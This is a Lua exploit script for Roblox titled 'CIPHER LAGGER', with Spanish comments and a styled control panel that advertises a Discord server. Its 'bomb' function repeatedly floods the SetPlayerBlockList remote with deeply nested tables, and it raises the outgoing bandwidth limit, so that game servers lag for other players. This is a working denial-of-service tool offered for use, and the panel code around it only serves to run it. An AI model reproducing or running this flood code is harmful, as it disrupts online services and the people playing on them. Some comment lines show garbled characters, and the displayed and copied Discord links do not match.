--// CIPHER LAGGER- PANEL CON LOGO DE FONDO (BORDES REDONDEADOS)
--// EFECTOS: Título neón azul, botones con neón dinámico (blanco/gris inactivo, azul claro activo)
--// Fondo de botones: gris neón (inactivo), negro (activo) - SIN SOMBRAS
--// ACTIVACIÓN CON TECLA M (fija, sin selector visual)
--// DISCORD: botón abajo del HIGH que copia el enlace al portapapeles
--// SWITCH: ENABLE/DISABLE con fondo blanco, texto neón azul y bola negra
--// BOTÓN LOCK: fondo negro neón, texto blanco neón brillante
--// BOTÓN LOCK un poco más abajo (Y=4)

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "CIPHERLaggerConfig.json"

-- Tamaño dinámico (un poco más grande para que quepa HIGH más abajo)
local isTouchEnabled = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local uiWidth = isTouchEnabled and 170 or 300
local uiHeight = isTouchEnabled and 205 or 270  -- Aumentado para dar espacio

-- ⚙️ PODER EXACTO: 32 - 70
local NIVELES = {
    Medium   = { poder = 32 },
    High     = { poder = 70 }
}

-- 🔑 TECLA FIJA (M, sin selector visual)
local keybind = Enum.KeyCode.M
local laggerActive = false
local lagThread = nil
local nivelActual = "Medium"
local ventanaBloqueada = false

-- 🎨 ESTILO
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(200, 200, 220),
    ButtonInact  = Color3.fromRGB(190, 195, 215),
    ButtonMedium = Color3.fromRGB(0, 0, 0),
    ButtonHigh   = Color3.fromRGB(0, 0, 0),
    ToggleOff    = Color3.fromRGB(255, 255, 255), -- Fondo blanco para el switch
    ToggleOn     = Color3.fromRGB(255, 255, 255),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(50, 50, 50),
}

-- 🌈 GRADIENTES
local GRADIENTE_BLANCO_GLOW = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 40)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(120, 120, 160)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 220, 240)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(120, 120, 160)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 40))
})

local GRADIENTE_AZUL_GLOW = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 40, 100)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(70, 160, 220)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 220, 255)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(70, 160, 220)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 40, 100))
})

local GRADIENTE_AZUL_CLARO = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 60, 120)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(80, 180, 240)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 230, 255)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(80, 180, 240)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 60, 120))
})

-- GRADIENTE BLANCO CLARO PARA LOCK (texto neón)
local GRADIENTE_BLANCO_CLARO = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 60)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(200, 200, 220)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200, 200, 220)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 60))
})

-- 💾 CONFIG
local function SaveConfig()
    local data = {
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "Medium"
            if nivelActual == "Low" then nivelActual = "Medium" end
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnMedium, btnHigh, lockButton
local lockBase, lockGlow, lockGradient
local titleLabel, toggleClick, shadowLabel, shadowGradient
local toggleBase, toggleGlow, toggleGlowGradient
local medBase, medGlow, medGradient
local highBase, highGlow, highGradient
local glowFrame, glowGradient

-- Funciones de actualización
local function actualizarBotonesNivel()
    if nivelActual == "Medium" then
        btnMedium.BackgroundColor3 = UI_CONFIG.ButtonMedium
        btnMedium.BorderSizePixel = 0
        medBase.TextColor3 = Color3.fromRGB(0, 0, 0)
        medGlow.TextColor3 = Color3.fromRGB(120, 200, 255)
        medGlow.TextTransparency = 0
        medGradient.Color = GRADIENTE_AZUL_GLOW
    else
        btnMedium.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMedium.BorderSizePixel = 1
        btnMedium.BorderColor3 = UI_CONFIG.BorderColor
        medBase.TextColor3 = Color3.fromRGB(0, 0, 0)
        medGlow.TextColor3 = Color3.fromRGB(220, 220, 240)
        medGlow.TextTransparency = 0
        medGradient.Color = GRADIENTE_BLANCO_GLOW
    end

    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonHigh
        btnHigh.BorderSizePixel = 0
        highBase.TextColor3 = Color3.fromRGB(0, 0, 0)
        highGlow.TextColor3 = Color3.fromRGB(120, 200, 255)
        highGlow.TextTransparency = 0
        highGradient.Color = GRADIENTE_AZUL_GLOW
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
        highBase.TextColor3 = Color3.fromRGB(0, 0, 0)
        highGlow.TextColor3 = Color3.fromRGB(220, 220, 240)
        highGlow.TextTransparency = 0
        highGradient.Color = GRADIENTE_BLANCO_GLOW
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff -- Blanco
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Siempre negro
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -22, 0.5, -10)
        else
            toggleBall.Position = UDim2.new(0, 1, 0.5, -10)
        end
    end
    local texto = laggerActive and "ENABLE" or "DISABLE"
    if toggleBase and toggleGlow then
        toggleBase.Text = texto
        toggleGlow.Text = texto
    end
end

local function actualizarCandado()
    local texto = ventanaBloqueada and "lock" or "unlock"
    if lockBase and lockGlow then
        lockBase.Text = texto
        lockGlow.Text = texto
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 1, 0.5, -10)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos
    }):Play()
    actualizarSwitch()
    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼︄1�7 INTERFAZ
if CoreGui:FindFirstChild("SUREHubLagger_UI") then CoreGui.SUREHubLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SUREHubLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0, 80, 180)
mainFrame.Size = UDim2.new(0, uiWidth, 0, uiHeight)
mainFrame.Position = UDim2.new(0.5, -uiWidth/2, 0.5, -uiHeight/2)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)

-- LOGO DE FONDO
local logoImage = Instance.new("ImageLabel", mainFrame)
logoImage.BackgroundTransparency = 1
logoImage.Size = UDim2.new(1, 0, 1, 0)
logoImage.Position = UDim2.new(0, 0, 0, 0)
logoImage.Image = "rbxassetid://93045102280822"
logoImage.ScaleType = Enum.ScaleType.Stretch
logoImage.ZIndex = 1
Instance.new("UICorner", logoImage).CornerRadius = UDim.new(0, 16)

-- ══════════════════════════════════════════╄1�7
-- TÍTULO "CIPHER LAGGER" CON EFECTO NEÓN AZUL
-- ══════════════════════════════════════════╄1�7
titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 3, 0, 0)
titleLabel.Size = UDim2.new(0, 120, 0, 22)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "CIPHER LAGGER"
titleLabel.TextColor3 = Color3.fromRGB(5, 10, 30)
titleLabel.TextSize = 14
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.ClipsDescendants = false

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0, 3, 0, 0)
shadowLabel.Size = UDim2.new(0, 120, 0, 22)
shadowLabel.Font = Enum.Font.GothamBlack
shadowLabel.Text = "CIPHER LAGGER"
shadowLabel.TextSize = 14
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(0, 120, 255)

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 40, 100)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 100, 200)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 150, 255)),
    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(0, 100, 200)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 40, 100))
})
shadowGradient.Rotation = 0

task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            shadowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.03)
        end
    end
end)

-- ══════════════════════════════════════════╄1�7
-- BOTÓN LOCK (Y=4) con FONDO NEGRO NEÓN y TEXTO BLANCO BRILLANTE
-- ══════════════════════════════════════════╄1�7
lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 0
lockButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
lockButton.BorderSizePixel = 1
lockButton.BorderColor3 = Color3.fromRGB(20, 20, 25)
lockButton.Position = UDim2.new(1, -38, 0, 4)
lockButton.Size = UDim2.new(0, 26, 0, 12)
lockButton.Font = Enum.Font.GothamBlack
lockButton.Text = ""
lockButton.TextSize = 6
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 5)

lockBase = Instance.new("TextLabel", lockButton)
lockBase.BackgroundTransparency = 1
lockBase.Size = UDim2.new(1, 0, 1, 0)
lockBase.Font = Enum.Font.GothamBlack
lockBase.Text = "Lock"
lockBase.TextColor3 = Color3.fromRGB(0, 0, 0)
lockBase.TextSize = 6
lockBase.TextXAlignment = Enum.TextXAlignment.Center
lockBase.TextYAlignment = Enum.TextYAlignment.Center
lockBase.ZIndex = 3

lockGlow = Instance.new("TextLabel", lockButton)
lockGlow.BackgroundTransparency = 1
lockGlow.Size = UDim2.new(1, 0, 1, 0)
lockGlow.Font = Enum.Font.GothamBlack
lockGlow.Text = "Lock"
lockGlow.TextColor3 = Color3.fromRGB(255, 255, 255)
lockGlow.TextSize = 6
lockGlow.TextXAlignment = Enum.TextXAlignment.Center
lockGlow.TextYAlignment = Enum.TextYAlignment.Center
lockGlow.ZIndex = 4
lockGlow.ClipsDescendants = true
lockGlow.TextTransparency = 0.15

lockGradient = Instance.new("UIGradient", lockGlow)
lockGradient.Color = GRADIENTE_BLANCO_CLARO
lockGradient.Rotation = 0

task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            lockGradient.Offset = Vector2.new(i, 0)
            task.wait(0.03)
        end
    end
end)

lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- ══════════════════════════════════════════╄1�7
-- SWITCH (ACTIVE/INACTIVE) con fondo blanco, texto neón y bola negra
-- ══════════════════════════════════════════╄1�7
glowFrame = Instance.new("Frame", mainFrame)
glowFrame.BackgroundTransparency = 0.8
glowFrame.Size = UDim2.new(0, 70, 0, 28)
glowFrame.Position = UDim2.new(1, -78, 0, 20)
glowFrame.ZIndex = 1
Instance.new("UICorner", glowFrame).CornerRadius = UDim.new(1, 0)
glowGradient = Instance.new("UIGradient", glowFrame)
glowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 200)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 200))
})
glowGradient.Rotation = 0
task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            glowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.03)
        end
    end
end)

toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -68, 0, 23)
toggleContainer.Size = UDim2.new(0, 60, 0, 22)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1, 0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleBall.Size = UDim2.new(0, 20, 0, 20)
toggleBall.Position = UDim2.new(0, 1, 0.5, -10)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1, 0)

local textFrame = Instance.new("Frame", toggleContainer)
textFrame.BackgroundTransparency = 1
textFrame.Size = UDim2.new(1, 0, 1, 0)
textFrame.ZIndex = 3

toggleBase = Instance.new("TextLabel", textFrame)
toggleBase.BackgroundTransparency = 1
toggleBase.Size = UDim2.new(1, 0, 1, 0)
toggleBase.Font = Enum.Font.GothamBlack
toggleBase.Text = "DISABLE"
toggleBase.TextColor3 = Color3.fromRGB(0, 0, 0)
toggleBase.TextSize = 11
toggleBase.TextXAlignment = Enum.TextXAlignment.Center
toggleBase.TextYAlignment = Enum.TextYAlignment.Center
toggleBase.ZIndex = 3

toggleGlow = Instance.new("TextLabel", textFrame)
toggleGlow.BackgroundTransparency = 1
toggleGlow.Size = UDim2.new(1, 0, 1, 0)
toggleGlow.Font = Enum.Font.GothamBlack
toggleGlow.Text = "DISABLE"
toggleGlow.TextColor3 = Color3.fromRGB(160, 230, 255)
toggleGlow.TextSize = 11
toggleGlow.TextXAlignment = Enum.TextXAlignment.Center
toggleGlow.TextYAlignment = Enum.TextYAlignment.Center
toggleGlow.ZIndex = 4
toggleGlow.ClipsDescendants = true
toggleGlow.TextTransparency = 0.2

toggleGlowGradient = Instance.new("UIGradient", toggleGlow)
toggleGlowGradient.Color = GRADIENTE_AZUL_CLARO
toggleGlowGradient.Rotation = 0

task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            toggleGlowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.03)
        end
    end
end)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 1
toggleClick.Size = UDim2.new(1, 0, 1, 0)
toggleClick.ZIndex = 5
toggleClick.Text = ""
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false

actualizarSwitch()

-- ══════════════════════════════════════════╄1�7
-- BOTONES MEDIUM / HIGH (MEDIUM más abajo, HIGH sin mover)
-- ══════════════════════════════════════════╄1�7
local btnW = 80
local btnH = 22
local topY = isTouchEnabled and 53 or 58      -- Aumentado 8px
local gapBetween = isTouchEnabled and 30 or 38 -- Reducido 8px para compensar
local btnYMed = topY
local btnYHigh = btnYMed + btnH + gapBetween   -- HIGH queda igual que antes
local discordY = btnYHigh + btnH + 4           -- Discord justo debajo de HIGH (sin cambios)
local btnX = (uiWidth - btnW) / 2

local function crearBoton(posX, posY, texto)
    local btn = Instance.new("TextButton", mainFrame)
    btn.Size = UDim2.new(0, btnW, 0, btnH)
    btn.Position = UDim2.new(0, posX, 0, posY)
    btn.Font = UI_CONFIG.Font
    btn.Text = ""
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = UI_CONFIG.ButtonInact
    btn.BorderSizePixel = 1
    btn.BorderColor3 = UI_CONFIG.BorderColor
    btn.ZIndex = 2
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    local base = Instance.new("TextLabel", btn)
    base.BackgroundTransparency = 1
    base.Size = UDim2.new(1, 0, 1, 0)
    base.Position = UDim2.new(0, 0, 0, 0)
    base.Font = Enum.Font.GothamBlack
    base.Text = texto
    base.TextColor3 = Color3.fromRGB(0, 0, 0)
    base.TextSize = 11
    base.TextXAlignment = Enum.TextXAlignment.Center
    base.TextYAlignment = Enum.TextYAlignment.Center
    base.ZIndex = 3

    local glow = Instance.new("TextLabel", btn)
    glow.BackgroundTransparency = 1
    glow.Size = UDim2.new(1, 0, 1, 0)
    glow.Position = UDim2.new(0, 0, 0, 0)
    glow.Font = Enum.Font.GothamBlack
    glow.Text = texto
    glow.TextColor3 = Color3.fromRGB(120, 200, 255)
    glow.TextSize = 11
    glow.TextXAlignment = Enum.TextXAlignment.Center
    glow.TextYAlignment = Enum.TextYAlignment.Center
    glow.ZIndex = 4
    glow.ClipsDescendants = true
    glow.TextTransparency = 0

    local grad = Instance.new("UIGradient", glow)
    grad.Color = GRADIENTE_AZUL_GLOW
    grad.Rotation = 0

    task.spawn(function()
        while true do
            for i = 0, 1, 0.006 do
                grad.Offset = Vector2.new(i, 0)
                task.wait(0.03)
            end
        end
    end)

    return btn, base, glow, grad
end

btnMedium, medBase, medGlow, medGradient = crearBoton(btnX, btnYMed, "MEDIUM")
btnMedium.MouseButton1Click:Connect(function()
    nivelActual = "Medium"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnHigh, highBase, highGlow, highGradient = crearBoton(btnX, btnYHigh, "HIGH")
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)

actualizarBotonesNivel()

-- ══════════════════════════════════════════╄1�7
-- BOTÓN DE DISCORD (justo debajo de HIGH)
-- ══════════════════════════════════════════╄1�7
local discordBtn = Instance.new("TextButton", mainFrame)
discordBtn.Size = UDim2.new(0, btnW, 0, 16)
discordBtn.Position = UDim2.new(0, btnX, 0, discordY)
discordBtn.Text = "Discord: discord.gg/tbuwxad8e"
discordBtn.TextSize = 8
discordBtn.Font = Enum.Font.GothamBlack
discordBtn.TextColor3 = Color3.fromRGB(180, 200, 255)
discordBtn.BackgroundTransparency = 1
discordBtn.AutoButtonColor = false
discordBtn.ZIndex = 2
discordBtn.TextXAlignment = Enum.TextXAlignment.Center
discordBtn.TextYAlignment = Enum.TextYAlignment.Center
discordBtn.MouseButton1Click:Connect(function()
    pcall(function()
        setclipboard("https://discord.gg/YY3aX2DRE")
        discordBtn.Text = "✄1�7 Copied!"
        task.wait(1)
        discordBtn.Text = "Discord: discord.gg/tbuwxad8e"
    end)
end)

-- ARRASTRAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ACTIVACIÓN CON TECLA M
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)